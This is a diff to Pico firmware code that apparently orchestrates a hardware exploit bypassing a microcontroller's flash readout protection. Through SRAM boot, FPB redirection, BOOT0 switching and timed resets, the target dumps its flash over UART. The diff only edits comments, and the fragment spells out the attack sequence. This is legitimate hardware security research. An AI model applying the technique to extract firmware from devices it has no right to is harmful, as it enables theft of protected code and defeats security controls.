@@ -100,7 +100,7 @@ int main()
 	gpio_put(BOOT0_PIN, 1); // Will be necessary later, might as well set it now
 	gpio_put(LED_PIN, 0);
 
-	// -- Ensure that the shell-code has been loaded into the DUT's SRAM before preceeding --
+	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --
 
 	// Wait for any serial input to start the attack
 	while (getchar_timeout_us(0) == PICO_ERROR_TIMEOUT) {
@@ -120,17 +120,17 @@ int main()
 	gpio_put(POWER_PIN, 1);
 
 	// Debugger lock is now disabled and we're now
-	// booting from SRAM. Wait for the DUT to run stage 1
+	// booting from SRAM. Wait for the target to run stage 1
 	// of the exploit which sets the FPB to jump to stage 2
 	// when the PC reaches a reset vector fetch (0x00000004)
 	sleep_ms(15);
 
-	// Set BOOT0 to boot from flash. This will trick the DUT
+	// Set BOOT0 to boot from flash. This will trick the target
 	// into thinking it's running from flash, which will
 	// disable readout protection.
 	gpio_put(BOOT0_PIN, 0);
 
-	// Reset the DUT
+	// Reset the target
 	gpio_set_dir(RESET_PIN, GPIO_OUT);
 	gpio_put(RESET_PIN, 0);
 
@@ -138,9 +138,9 @@ int main()
 	sleep_ms(15);
 
 	// Release reset
-	// Due to the FPB, the DUT will now jump to
-	// stage 2 of the exploit, which will output a shell
-	// over UART with readout protection disabled.
+	// Due to the FPB, the target will now jump to
+	// stage 2 of the exploit and dump the contents
+	// of the flash over UART
 	gpio_set_dir(RESET_PIN, GPIO_IN);
 
 	// Wait for dump start magic to ensure
